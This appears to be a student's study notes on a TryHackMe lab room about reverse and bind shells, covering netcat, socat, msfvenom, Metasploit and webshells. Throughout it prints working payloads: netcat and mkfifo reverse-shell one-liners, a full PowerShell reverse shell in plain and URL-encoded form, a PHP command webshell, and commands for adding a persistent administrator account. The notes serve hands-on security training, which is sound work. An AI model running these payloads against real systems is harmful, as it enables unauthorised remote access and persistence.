---

# What is a shell? - Try Hack Me room

---

## Objective 

- An introduction to sending and receiving (reverse/bind) shells when exploiting target machines

**Shells** 
- are what we use when interfacing with a Command Line environment (CLI).
- the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows.
- When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code.
- When this happens, we want to use this initial access to obtain a shell running on the target.

**In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port on the server which we can connect to in order to execute further commands (a bind shell).**

---

<details>
<summary>Tools</summary>

- variety of tools we can use to receive reverse shells and to send bind shells
- we need malicious shell code and a way of interfacing with the resulting shell

---

## Netcat 

- used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration
- but more importantly it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system
- Netcat shells are very unstable (easy to lose) by default
- but can be improved by techniques

---

## Socat

- like netcat on steroids
- can do all the same things and many more
- socat shells usually more stable than netcat shells out of the box
- so in this sense its superior to netcat but there are 2 big catches:
1. the syntax is more difficult
2. netcat is installed on virtually every Linux distribution by default, socrat rarely installed by default

- Both Socat and Netcat have .exe versions for use on Windows

---

## Metasploit -- multi/handler

- `exploit/multi/handler` module of metasploit used to receive reverse shells
- part of the Metasploit framework so multi/handler provides fully-fledged way to obtain stable shells
- with a wide variety of options to improve the caught shell
- also the only way to interact with a meterpreter shell
- easiest way to handle staged payloads

---

## Msfvenom 

- technically part of the Metasploit Framework but it is shipped as a standalone tool
- Msfvenom is used to generate payloads on the fly
- msfvenom can generate payloads other than reverse and bind shells

---

- there are some repositories of shells in many different languages
- most prominent of these is Payloads all the Things.
- PentestMonkey Reverse Shell Cheatsheet is also commonly used
- Kali Linux also comes pre-installed with a variety of webshells located at `/usr/share/webshells`
- SecLists repo, though primarily used for wordlists, also contains some very useful code for obtaining shells

</details>

<details>
<summary>Types of Shell</summary>

- At a high level, we are interested in two kinds of shell when it comes to exploiting a target

**reverse shells**

- when the target is forced to execute code that connects back to your computer
- On our computer we would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection
- reverse shells =  good way to bypass firewall rules that may prevent us from connecting to arbitrary ports on the target
- but when receiving a shell from a machine across the internet, we would need to configure our own network to accept the shell
- not a problem on TryHackMe network due to the method by which we connect into the network

**Bind shells**

- when the code executed on the target is used to start a listener attached to a shell directly on the target
- then be opened up to the internet -> so can connect to the port that the code has opened and obtain remote code execution that way
-  has the advantage of not requiring any configuration on our own network
- but may be prevented by firewalls protecting the target

**generally reverse shells are easier to execute and debug**

---

## Reverse shell example:


- left = reverse shell listener -> this is what receives the connection
- right = simulation of sending reverse shell
- more likely to be done through code injection on remote websites
- think of the left being our computer and right being the target

<img width="1051" height="156" alt="image" src="https://github.com/user-attachments/assets/d516d053-93f8-45e9-b824-15daeaf9603e" />

-> attacking machine: `sudo nc -lvnp 443`(run listener)

-> target: `nc <LOCAL-IP> <PORT> -e /bin/bash`(netcat)

- after running command on right, listener recevies a connection
- when `whoami` is run -> we see we are executing commands as the target user
- **we are listening on our own attacking machine and sending a connection from the target**

---

## Bind shell example:

- left = attacker's computer
- right = stimulated target
- windoes target this time
- first start listener on target -> this time also telling it execute `cmd.exe`
- then with listener up and running - connect from our own machine to newly opened port


<img width="1327" height="207" alt="image" src="https://github.com/user-attachments/assets/2c291ff5-a824-4806-bc9f-5b36d617b7e3" />


-> on the target: `nc -lvnp <port> -e "cmd.exe"`

-> on attacking machine: `nc MACHINE_IP <port>`

- gives us code execution on the remote machine. Note -> not specific to Windows

---

## Interactivity 

- Shells can be either interactive or non-interactive

**Interactive shell**

- Powershell, Bash, Zsh, sh, or any other standard CLI environment
- these allows us to interact with programs after executing them
- example take SSH login prompt:

<img width="621" height="82" alt="image" src="https://github.com/user-attachments/assets/75a18e31-7bbf-4ba1-b224-a9a24c2113be" />

- can see it's asking interactively that the user type either yes or no in order to contiue connection
- this is an interactive program, which requires an interactive shell in order to run

**Non-interactive shell**

- limited to using programs which do not require user interaction in order to run properly
- majority of simple reverse and bind shells are non-interactive -> can make further exploitation trickier
- run SSH in a non-interactive shell:

<img width="492" height="210" alt="image" src="https://github.com/user-attachments/assets/fe5431d8-70f8-477c-8611-e9dcb51f248c" />

- `whoami` command (which is non-interactive) executes perfectly
- `ssh` command (which is interactive) gives us no output at all
- output of an interactive command does go somewhere but figuring out where is an exercise for you to attempt on your own

**interactive programs do not work in non-interactive shells**

- `listener` command is an alias unique to the attacking machine used for demonstrations
- it's shorthand way of typing `sudo rlwrap nc -lvnp 443`
- will not work on any other machine unless the alias has been configured locally

--- 

<img width="477" height="137" alt="image" src="https://github.com/user-attachments/assets/af519399-002f-4cc6-afd7-9e9020d57748" />

</details>

<details>
<summary>Netcat</summary>

## Reverse shells

- reverse shells require shellcode and a listener
- many ways to execute a shell so we'll start by looking at listeners

- syntax for starting netcat listener using linux: `nc -lvnp <port-number>`

   - `-l` tell netcat that this will be a listener
   - `-v` request verbose output
   - `-n` tells netcat not to resolve host names or use DNS
   - `-p` indicates the port specification will follow  

- realistically cab use any port we like as long as there isn't already a service using it
- if we choose a port beow 1024 will need to use `sudo` when starting listener
- good idea to use well known port (80, 443 or 53 being good choices) -> more likely to get past outbound firewall rules on the target

-> working example = `sudo nc -lvnp 443`

- can then connect back to this with any number of payloads depending on environment on the target  - example in previous task

## Bind shells 

- if looking to obtain a bind shell on target we can assume that there is already a listener waiting fod us on choosen port of the target - all we need to do is connect to it
- syntax = `nc <target-ip> <chosen-port>`
- here we are using netcat to make an outbound connection to the target on our chosen port
- here it is important to understand how to connect to a listening port using netcat

--- 

<img width="479" height="91" alt="image" src="https://github.com/user-attachments/assets/0f7c34f2-0d89-4423-afd7-7668fb109171" />

</details>

<details>
<summary>Netcat shell Stabilisation</summary>

- we have caught or connected to a netcat shell, what's next?
- these shells are unstable by default
- ctrl+c = kills the whole thing
- non-interactive and often have formatting errors -> due to netcat "shells" really being processes running inside a terminal rather (rather than being bonafide terminals in their own right)
- there are many ways to stabilise netcat shells on Linux systems
- Stabilisation of Windows reverse shells = harder

---

## Technique 1: Python

- applicable only to Linux boxes as nearly always by default have python installed
- 3 stage process:

1. use `python -c 'import pty;pty.spawn("/bin/bash")'`

     - this uses python to spawn a better feature bash shell.
     - some targets may need the version of Python specified (if so replace `python` with `python2`, `python3` etc.)
     - rn our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell

2. `export TERM=xterm` -> gives us access to term commands like `clear`
3. background the shell using Ctrl + Z

     -  Back in our own terminal we use `stty raw -echo; fg`
     -  this turns off our own terminal echo (gives us access to tab autocompletes, arrow keys, ctrl+c to kill processes)
     -  then foregrounds the shell -> completing the process
  
<img width="664" height="385" alt="image" src="https://github.com/user-attachments/assets/4b1069cc-7d52-456e-9938-5a4d908ea6d4" />

- if shell dies, any input in our own terminal will not be visible (result of having disabled terminal echo). fix this -> type reset and press enter.

---

## Technique 2: rlwrap

- rlwrap -> program that gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell
- but some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell
- rlwrap not installed by default on Kali, so first install it with `sudo apt install rlwrap`

-> To use rlwrap, we invoke a slightly different listener: `rlwrap nc -lvnp <port>`

- prepending our netcat listener with "rlwrap" -> gives more fully featured shell
- technique is useful when dealing with Windows shells -> otherwise notoriously difficult to stabilise
- when dealing with Linux target it's possible to comepletely stabilise by using same trick in step 3 of previous technique
- background with ctrl+z then using `stty raw -echo; fg` to stabilise and re-enter the shell

---

## Technique 3: Socat

- use an initial netcat shell as a stepping stone into a more fully-featured socat shell
- this technique is limited to Linux targets (Socat shell on Windows will be no more stable than a netcat shell)



- first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine.
- typical way to achieve this -> using a webserver on the attacking machine inside the directory containing your socat binary `sudo python3 -m http.server 80`
- then on target machine using netcat shell to download the file - on linux accomplished with curl or wget: `wget <LOCAL-IP>/socat -O /tmp/socat`



- for sake of completeness: in windows CLI environment same can be done with powershell using either Invoke-WebRequest or a webrequest system class
- depending on version of powershell installed `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`
- will cover syntax for sending and receiving shells with Socat in upcoming tasks

---

- with any of above techniques useful to be able to change terminal tty size
- this is something your terminal will do automatically when using a regualar shell but must be done manually in a reverse or bind shell if we want something like a text editor -> overwrites everything on the screen

-> first open another terminal and run `stty -a` - will give us large stream of output - note values for "rows" and columns


<img width="995" height="65" alt="image" src="https://github.com/user-attachments/assets/25524b25-66f5-496a-b506-b3906d0e0269" />

- next in reverse/bind shell type: `stty rows <number>` and `stty cols <number>`
- Filling in the numbers we got from running the command in our own terminal
- will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open

---


<img width="477" height="107" alt="image" src="https://github.com/user-attachments/assets/8c76d132-49eb-4c4a-9ac6-2f7f14b8360c" />

</details>

<details>
<summary>Socat</summary>

- a connector between two points
- this essentially be a listening port and the keyboard but it could also be a listening port and a file, or indeed, two listening ports
- All socat does is provide a link between two points

## Reverse shells 

- syntax for a basic reverse shell listener in socat: `socat TCP-L:<port> -`
- always with socat, this is taking two points (a listening port, and standard input) and connecting them together
- resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to `nc -lvnp <port>`

On Windows use to connect back: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`

- The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output

equivalent command for a Linux Target: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

---

## Bind shells

-  Linux target we would use: `socat TCP-L:<PORT> EXEC:"bash -li"`
-  Windows target we would use `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
-  use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment

-> regardless of the target, we use this command on our attacking machine to connect to the waiting listener: `socat TCP:<TARGET-IP>:<TARGET-PORT> -`

---

## one of the more powerful uses for Socat: a fully stable Linux tty reverse shell

- only work when the target is Linux, but is significantly more stable
- new listener syntax: `socat TCP-L:<port> FILE:`tty`,raw,echo=0`

   -  we're connecting two points together
   -  this case -> listening port and a file
   -  we are passing in the current TTY as a file and setting the echo to be zero
   -  approximately equivalent to using the Ctrl + Z, `stty raw -echo; fg` trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.
 
- first listener can be connected to with any payload but this special listener must be activated with a very specific socat command
- means the target must have socat installed
- most machines do not have socat installed by default but it's possible to upload precompiled socat binary -> can then be executed as normal

   - special command: `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
       
        - first part -- we're linking up with the listener running on our own machine
        - second part of the command creates an interactive bash session with `EXEC:"bash -li"`

- also passing the arguments: pty, stderr, sigint, setsid and sane:

   - **pty** allocates a pseudoterminal on the target -- part of the stabilisation process
   - **stderr** makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
   - **sigint** passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
   - **setsid** creates the process in a new session
   - **sane** stabilises the terminal, attempting to "normalise" it
 
  <img width="1247" height="173" alt="image" src="https://github.com/user-attachments/assets/2c9367f3-ad9b-45a1-acf2-182020b86165" />

- left = listener running on local attacking machine
- right = have simulation of a compromised target running with a non interactive shell
- using non-interactive netcat shell we execute the special socat command and receive fully interactive bash shell on the socat listener to the left
- socat shell is fully interactive, allowing us to use interactive commands such as SSH.
- can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.

---

- if any point socat shell not working correctly worth increasing verbosity by adding `-d -d` into command
- very useful for experimental purposes but not usually necessary for general use

---

<img width="476" height="68" alt="image" src="https://github.com/user-attachments/assets/3d571a29-6f30-4031-b80d-44aeefd93a17" />


</details>

<details>
<summary>Socat Encrypted Shells</summary>

- socat capable of creating encrypted shells -- both bind and reverse
- encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result
- in previous task any time `TCP` was used as part of a command should be replaced with `OPENSSL` when working with encrypted shells

->  first need to generate a certificate in order to use encrypted shells easiest to do on our attacking machine:

     openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

- command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year
-  it will ask you to fill in information about the certificate -> can be left blank or filled randomly

-> then need to merge the two created files into a single `.pem` file:

    cat shell.key shell.crt > shell.pem

-> then  we set up our reverse shell listener

    socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

- This sets up an OPENSSL listener using our generated certificate
- `verify=0`
- tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority
- note that the certificate must be used on whichever device is listening.

-> To connect back

     socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

-> target:

     socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

-> attacker:

     socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -

-  note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required
- following image shows an OPENSSL Reverse shell from a Linux target
- target = right attacker = left:

<img width="1852" height="704" alt="image" src="https://github.com/user-attachments/assets/a131be7e-6785-4f2e-bea4-377da76e20c0" />

-  technique will also work with the special, Linux-only TTY shell covered in the previous task
-  figuring out the syntax for this will be the challenge for this task

--- 

<img width="479" height="106" alt="image" src="https://github.com/user-attachments/assets/745b4702-e85e-4164-9f18-e79c18599521" />

</details>

<details>
<summary>Common Shell Payloads</summary>

- take a look at some common payloads using the tools we've already covered

---

## ways to use netcat as a listener for a bindshrll 

- in some version of netcat (including `nc.exe` windows version included with kali at `/usr/share/windows-resources/binaries` and the version used in kali itself: `netcat-traditional`)
- `-e` allows us to execute a process on connection
- e.g. as a listener:

    nc -lvnp <PORT> -e /bin/bash


- connecting to above listener with netcat results in bind shell on the target
- for reverse shell connecting back with `nc <LOCAL-IP> <PORT> -e /bin/bash` = results in reverse shell on the target

- but this is not included in most versions of netcat as it's seen to be insecure

-> on windows where static binary nearly always required anyway this technique works perfectly 

- linux we would instead use this code to create listener for a bind shell

      mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f


<img width="1228" height="121" alt="image" src="https://github.com/user-attachments/assets/be401a6a-58b6-4b27-a2a7-130cef923a85" />

- similar command can be used to send netcat reverse shell

       mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

<img width="439" height="77" alt="image" src="https://github.com/user-attachments/assets/caec41fd-0865-40aa-a2c9-ab0afecf7b87" />

- uses the netcat connect syntax as opposed to netcat listen syntax


<img width="1407" height="150" alt="image" src="https://github.com/user-attachments/assets/22dbb846-be92-463c-bee2-63f5e29291da" />

---

- when targeting a modern Windows Server it's very common to require a Powershell reverse shell
- we will cover the standard one-liner PSH reverse shell here

      powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)

- this command (once putting IP and port)  can be copied into cmd.exe shell (or another method of executing commands on a window server such as a webshell) and executed resulting in reverse shell:

<img width="1008" height="310" alt="image" src="https://github.com/user-attachments/assets/7a908df5-8e9f-49a5-9dc5-a75e3176672b" />

---

-  PayloadsAllTheThings is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting)
-  in many different languages

---

<img width="428" height="141" alt="image" src="https://github.com/user-attachments/assets/447035aa-2f73-4790-bbde-bfcf8816ff8b" />

</details>

<details>
<summary>msfvenom</summary>

**Msfvenom: the one-stop-shop for all things payload related.**

- part of metasploit framework
- msfvenom -> used to generate code for primarily reverse and bind shells
- used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit
- can be used to generate payloads in various formats (e.g. `.exe`, `.aspx`, `.war`, `.py`)

-> standard syntax for msfvenom

      msfvenom -p <PAYLOAD> <OPTIONS>


-> example 
- to generate windows x64 reverse shell in an exe format we can use:

     msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>


<img width="852" height="124" alt="image" src="https://github.com/user-attachments/assets/98609a04-8745-4f7a-861b-9eb66cf43783" />

-> here we are using a payload and four options

- -f (format)

   - specifies the output format - this case it's an executable (exe)

- -o (file)

   - output location and filename for generated payload
 
- LHOST= IP

   - specifies IP to connect back to. when using THM this is our tun0 IP address, if unable to load link then we are not connected to the vpn
 

- LPORT= port

    - port on local machine to connect back to. can be anything between 0 and 65535 that's not already in use. ports below 1024 are restricted and require a listener running with root privileges
 

  ---

  ## Staged vs Stageless

- there are staged reverse shell payloads and stageless reverse shell payloads

**staged payloads**

- sent in 2 parts. first small stager then main payload is fetched loaded into memory
- piece of code executed directly on server itself.
- connects back to waiting listener - doesn't contain any reverse shell code by itself.
- it connects to the listener and uses the connection to load real payload - executing it directly preventing it from touching the disk (where it could be caught by traditional anti virus solutions)
- so payload is split into 2 parts - small initial stager then bulkier reverse shell code (downloaded when stager is activated)
- staged payloads require special listener - usually metasploit multi/handler

**stageless payloads**

- more common
- are entirely self-contained -> there is one pieve of code that when executed sends a shell back immediately to waiting listener

---

stageless payloads tend to be easier to use and catch 
but are also bulkier and easier for antivirus or intrusion detection program to discover and remove 
staged = harder to use but initial stager is a lot shorter snd sometimes missed by less-effective antivirus software 
some  antivirus solutions make use of Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager -> making staged payloads less effective than they would once have been in this area

---

## Meterpreter 

- Meterpreter shells are Metasploit's own brand of fully-featured shell
- are completely stable = very good thing when working with Windows targets
- also have a lot of inbuilt functionality

      - like file uploads and downloads

- want to use any of Metasploit's post-exploitation tools = need to use a meterpreter shell
- downside = must be caught in Metasploit

---

## Payload naming conventions 

- with msfvenom it's important to understand how naming system works 

-> basic convention is: 

     <OS>/<arch>/<payload>

-> for example:

      linux/x86/shell_reverse_tcp

- this would generate a stageless reverse shell for an x86 Linux target
- the arch is not specified for windows 32bit targets e.g.

      windows/shell_reverse_tcp

- for 64bit windows target arch would be specified (x64)
- `shell_reverse_tcp` -> indicates it's stageless payload
- b/c stageless payloads are denoted with underscores (`_`)

-> staged payloads denoted with another `/`

      shell/reverse_tcp

- rule also applies to meterpreter payloads


-> windows 64bit staged meterpreter:

        windows/x64/meterpreter/reverse_tcp

-> linux 32bit stageless meterpreter payload:

        linux/x86/meterpreter_reverse_tcp

---

      msfvenom --list payloads 

- can be used to list all available payloads
- can then be piped into `grep` to search for specific of payloads

<img width="1320" height="254" alt="image" src="https://github.com/user-attachments/assets/0c1c151d-c705-48b4-a2de-589c50ffd14b" />

- gives us full set of Linux meterpreter payloads for 32bit targets

---

<img width="842" height="152" alt="image" src="https://github.com/user-attachments/assets/9d8e1555-bf4f-4633-b043-841a3d1e3fb5" />

</details>

<details>
<summary>Metasploit multi/handler</summary>

- multi/handler = tool for catching reverse shells
- essential if want to use meterpreter shells
- the go-to whne using staged payloads

1. open metasploit `mfsconsole`
2. type `use multi/handler` and press enter

- now are primed to start multi/handler session
- `options` can look at available options

<img width="719" height="384" alt="image" src="https://github.com/user-attachments/assets/b76997f5-315f-4333-8e24-069f7a0adb05" />

- 3 options we must set: payload, LHOST and LPORT
- identical to the options we set when generating shellcode with msfvenom - payload specific to our target as well as listening address and port we can receive a shell with
- LHOST must be specified here b/c metasploit won't listen on all network interfaces like etcat or socat will
- must be told a specific address to listen with

-> set options with

- `set PAYLOAD` 
- `set LHOST` (listen-adress)
- `set LPORT` (listen-port)

-> should now be ready to start listener 

- using `exploit -j`
- tells metasploit to launch the module
- running as a Job in the background

<img width="750" height="663" alt="image" src="https://github.com/user-attachments/assets/339e51ca-b44b-43e6-a432-675eb45d99f0" />

- in above example = metasploit listening on port under 1024 = metasploit must run with sudo permissions
- staged payload generated in the previous is run = Metasploit receives the connection ->  sending the remainder of the payload and giving us a reverse shell:


<img width="878" height="201" alt="image" src="https://github.com/user-attachments/assets/f58410cb-a8f8-4ff1-b07a-2e9122e049bf" />

- because the multi/handler was originally backgrounded, we needed to use `sessions 1` to foreground it again
- works as it was the only session running
-  other sessions active = use `sessions` -> see all active sessions
-  then use `sessions <number>` -> to select appropriate session to foreground


---

<img width="437" height="182" alt="image" src="https://github.com/user-attachments/assets/d2093ac5-3f42-4f7e-8a0f-f21847a2cb77" />

</details>

<details>
<summary>WebShells</summary>

- we may encounter websites that allow us to upload an executable file
- we use this oppotunity to upload code that would activate a reverse or bind shell
- sometimes not possible -> instead upload webshell

-> webshell = colloquial term for a script thst runs inside a webserver (usually in PHP or ASP) -> which executes code on the server 

- essentially commands are entered into a webpage - either HTML form or directly as arguments in the URL - then are executed by the script with results returned and written on the page
- useful if there are firewalls in place or even a stepping stone into fully fledged reverse or bind shell

-> PHP = most common server side scripting language

- one line format:
 
        <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>

  - this takes a GET parameter in URL and executes it on the system with `shell_exec()`
  - basically any commands we enter in the URL after `?cmd=` executed on the system - windows or linux
  - "pre" elements ensure the results are formatted correctly on the page
 
-> in action:

    <img width="899" height="473" alt="image" src="https://github.com/user-attachments/assets/271a331a-9ffa-4cca-b6f3-c5d486830b59" />

- when navigating the shell we used GET parameter "cmd" with command "ifconfig" -> this returned network info of the box
- a.k.a by entering `ifconfig` (used to check the network interfaces on Linux target) into URL of our shell it executed on the system with the results returned to us
- works for other commands like `whoami`, `hostname`, `arch` etc.

-> variety of webshells available on Kali by default at `/usr/share/webshells`

- most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers
- will not work on Windows by default

-> when target is windows often easiest to obtain RCE using a web shell or msfvenom to generate a reverse/bind shell in language of server 

- former method -> obtaining RCE is often done with a URL Encoded Powershell Reverse Shell
- would be copied into URL as 'cmd' argument:

         powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

  - same shell in task 8 but URL encoded to be used to safely in GET parameter
  - the IP and Port still need to be changed in above code


</details>

<details>
<summary>Next Steps</summary>

**We have the shell, now what?**

- covered how to generate, send and receive shells -> tend to be unstable and non-interactive

-> so what do we do about this?

## Linux 

- On Linux, gaining user-level access = usually first step. become a local user = can often escalate further from there.
- SSH keys in `/home/<user>/.ssh` are a common, high-value find — a private key lets you SSH in as that user from your machine (no password).
- In CTFs/labs, credentials (usernames/passwords, or private keys) are often left behind in files, scripts, configs, etc. Finding them can give quick access.
- Some vulnerabilities (e.g., Dirty COW) or writable system files (`/etc/passwd`, `/etc/shadow`) let us create or modify accounts -> can give SSH access if the SSH service is running.
- All of this only works = SSH actually running and reachable on the target (port 22 typically)

---
## Windows Post-Exploitation (Access & Persistence)

**credential discovery**

- registry: some applications store creds in plaintext/hashes in the registry

    - example: VNC servers often keep passwords in plaintext in the registry
 
- Config files: certain services save credentials in config files

    - FilleZilla FTP server (older versions)
 
      
        - `C:\Program Files\FileZilla Server\FileZilla Server.xml`
        - `C:\xampp\FileZilla Server\FileZilla Server.xml`
        - Depending on version → creds may be plaintext or MD5 hashes

---

**privilege goal**

- best case: obtain a shell as SYSTEM or Adminitrator account
- high privileges you can:

    - add own account (with admin right)
    - use it to connect via RDP, WinRM, SMB exec tools (`psexec`, `winexe`, etc.)

  ---

  **adding a user (persistence)**

1. create new user:

         net user <username> <password> /add

-> example:

         net user thmuser Passw0rd! /add

2. add user to the administrators group:

          net localgroup administrators <username> /add

-> example: 

         net localgroup administrators thmuser /add

---

**ways to log back in**

once account created (if the service is enabled/exposed)

- RDP (port 3389)
- WinRM (port 5985/5986)
- psexec (SMB-based remote exec)
- winexe (Linux tool for Windows command execution)
- Telnet (if running—rare in modern systems)
- Other exposed services


---

## important take away

- reverse and bind shells are essential technique for gaining remote code execution on a machine
- but they never be as fully featured as a native shell
- we always want to escalate into using a "normal" method for accessing the machine
- this will invariably be easier to use for further exploitation of the target 

</details>

<details>
<summary>Practice and Examples</summary>

- <img width="249" height="199" alt="image" src="https://github.com/user-attachments/assets/3bf4eb55-d600-4a26-9e55-b561e80e27c2" />


- <img width="251" height="281" alt="image" src="https://github.com/user-attachments/assets/8d47518c-5927-4dfb-871b-b158104b644c" />

---

- <img width="266" height="320" alt="image" src="https://github.com/user-attachments/assets/3c683b62-c334-40b6-b755-73d7e96e1402" />


- below is the exploit

<img width="377" height="125" alt="image" src="https://github.com/user-attachments/assets/64324ad9-9602-4a48-859e-213611d8c232" />

- add to desktop

<img width="398" height="430" alt="image" src="https://github.com/user-attachments/assets/0ad54f04-b41b-4407-88b5-49cba9f051e4" />

- put THM attack box IP in the reverse shell php

<img width="399" height="424" alt="image" src="https://github.com/user-attachments/assets/ca4d866b-7668-4834-820b-17db25870253" />

- now we set up netcat listener and upload and activate the shell on the Linux machine - command given in first question



- upload file (http://linuxip)

- <img width="435" height="323" alt="image" src="https://github.com/user-attachments/assets/fe346554-0d4a-4c7c-ae5d-22883a833b95" />
